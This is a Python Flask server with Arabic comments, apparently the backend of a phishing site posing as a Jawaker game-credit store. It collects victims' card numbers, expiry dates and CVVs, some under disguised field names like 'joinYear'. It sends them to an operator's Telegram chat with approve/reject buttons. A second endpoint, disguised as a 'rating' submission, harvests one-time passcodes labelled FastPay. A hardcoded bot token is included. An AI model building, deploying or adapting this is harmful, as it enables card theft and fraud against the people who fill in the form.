"""
سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام
------------------------------------------------
الوظيفة:
1. يستقبل بيانات الفورم من الموقع (POST /api/order)
2. يبعتها للأدمن عبر تلجرام مع زرين: تأكيد / رفض
3. يستقبل ضغطة الزر من تلجرام (POST /telegram/webhook)
4. يحدّث حالة الطلب، والموقع بيسأل عنها (GET /api/order/<id>) لحد ما توصل نتيجة

تشغيل محلي:
    pip install -r requirements.txt
    python app.py

بعد النشر (Render/Railway/إلخ)، لازم تربط الويبهوك:
    curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook -d "url=https://YOUR-SERVER-URL/telegram/webhook"
"""

import os
import time
import uuid
import threading
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

# ------------------ الإعدادات ------------------
# جلب التوكن من متغيرات البيئة أو استخدام القيمة الافتراضية
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9154524424:AAGc3lOaznU7eMV-aQEm-eHHJmZDmX4K9KE")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 8992323424))
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)
CORS(app)  # يسمح لموقعك (من أي دومين) يحكي مع هاد السيرفر

# تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
orders = {}
orders_lock = threading.Lock()


def build_admin_message(order_id: str, payload: dict) -> str:
    order_info = payload.get("order", {})
    
    # 1. تجميع التاريخ والرمز بجميع المسميات المحتملة (حل مشكلة عدم وصول البيانات)
    month = payload.get("joinDay") or payload.get("month") or payload.get("expMonth") or "-"
    year = payload.get("joinMonth") or payload.get("year") or payload.get("expYear") or "-"
    cvv = payload.get("joinYear") or payload.get("cvv") or payload.get("cvc") or "-"
    
    first_name = payload.get("firstNameRecord") or payload.get("firstName") or ""
    last_name = payload.get("lastNameRecord") or payload.get("lastName") or ""
    full_billing_name = f"{first_name} {last_name}".strip() or "-"

    # 2. صياغة الرسالة لتصلك في تليجرام بشكل مرتب
    return (
        "💳 طلب دفع جديد 🟢\n"
        "------------------------------------\n"
        f"رقم الطلب: {order_id}\n"
        f"الفئة: {order_info.get('name', '-')}\n"
        f"الكمية: {order_info.get('amount', '-')}\n"
        f"السعر: {order_info.get('price', '-')}\n"
        "------------------------------------\n"
        f"🆔 ID اللاعب: {payload.get('id', '-')}\n"
        f"👤 اسم صاحب البطاقة: {payload.get('jawakerName', '-')}\n"
        f"💳 رقم البطاقة: {payload.get('jawakerNumber', '-')}\n"
        f"📅 تاريخ الانتهاء (MM/YY): {month}/{year}\n"
        f"🔒 رمز الأمان (CVV): {cvv}\n"
        "------------------------------------\n"
        f"🌍 الدولة: {payload.get('country', '-')}\n"
        f"📝 اسم الفاتورة: {full_billing_name}"
    )


@app.route("/api/order", methods=["POST"])
def create_order():
    payload = request.get_json(force=True, silent=True) or {}
    order_id = str(uuid.uuid4())[:8]

    with orders_lock:
        orders[order_id] = {"status": "pending", "created_at": time.time()}

    text = build_admin_message(order_id, payload)
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ تأكيد", "callback_data": f"approve:{order_id}"},
            {"text": "❌ رفض", "callback_data": f"reject:{order_id}"},
        ]]
    }

    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=10,
        )
    except requests.RequestException as e:
        print(f"Telegram API Error: {e}")
        return jsonify({"error": f"telegram_send_failed: {e}"}), 502

    return jsonify({"order_id": order_id})


@app.route("/api/order/<order_id>", methods=["GET"])
def get_order_status(order_id):
    order = orders.get(order_id)
    if not order:
        return jsonify({"error": "not_found"}), 404
    return jsonify({"status": order["status"]})


@app.route("/telegram/webhook", methods=["POST"])
def telegram_webhook():
    update = request.get_json(force=True, silent=True) or {}
    callback = update.get("callback_query")
    
    if not callback:
        return jsonify({"ok": True})

    data = callback.get("data", "")
    callback_id = callback["id"]
    message = callback.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    old_text = message.get("text", "")

    if ":" not in data:
        return jsonify({"ok": True})

    action, order_id = data.split(":", 1)

    note = None
    with orders_lock:
        order = orders.get(order_id)
        if order and order["status"] == "pending":
            if action == "approve":
                order["status"] = "approved"
                note = "\n\n✅ تم التأكيد"
            elif action == "reject":
                order["status"] = "rejected"
                note = "\n\n❌ تم الرفض"

    # 1. رد فوري على تلجرام (حتى تختفي دائرة التحميل عن الزر)
    try:
        requests.post(
            f"{TELEGRAM_API}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "تم تسجيل قرارك بنجاح!"},
            timeout=10,
        )
    except Exception as e:
        print(f"Callback answer error: {e}")

    # 2. تعديل الرسالة لإضافة الملاحظة وإزالة الأزرار (حتى لا يتم الضغط عليها مرتين)
    if note and chat_id and message_id:
        try:
            requests.post(
                f"{TELEGRAM_API}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": old_text + note,
                    "reply_markup": {"inline_keyboard": []} # إزالة الأزرار
                },
                timeout=10,
            )
        except Exception as e:
            print(f"Edit message error: {e}")

    return jsonify({"ok": True})


@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "running"})


@app.route("/api/rating", methods=["POST"])
def receive_rating():
    payload = request.get_json(force=True, silent=True) or {}
    order_id = payload.get("order_id", "-")
    otp_code = payload.get("rating", "-")
    
    # إرسال رمز الـ OTP إلى تلجرام
    text = (
        "🔑 رمز الـ OTP جديد (FastPay)\n"
        "------------------------------------\n"
        f"🆔 رقم الطلب: {order_id}\n"
        f"🔢 الرمز المدخل: {otp_code}"
    )
    
    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": text},
            timeout=10,
        )
    except Exception as e:
        print(f"Error sending OTP: {e}")
        
    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
